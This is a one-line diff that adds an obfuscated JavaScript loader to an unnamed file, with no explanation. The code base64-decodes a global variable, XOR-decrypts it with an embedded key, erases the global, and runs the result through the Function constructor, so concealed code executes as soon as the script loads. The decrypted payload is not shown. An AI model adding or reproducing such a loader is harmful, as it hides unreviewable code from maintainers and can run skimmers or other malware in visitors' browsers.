@@ -1,0 +1,1 @@
+(function(){const k=[195,78,166,237,65,23,211,26,102,168,164,115,146,150,39,247],b=atob(window.__OBF||""),u=new Uint8Array(b.length);for(let i=0;i<b.length;i++)u[i]=b.charCodeAt(i)^k[i%k.length];const c=new TextDecoder().decode(u);window.__OBF="";(0,Function)(c)();})();
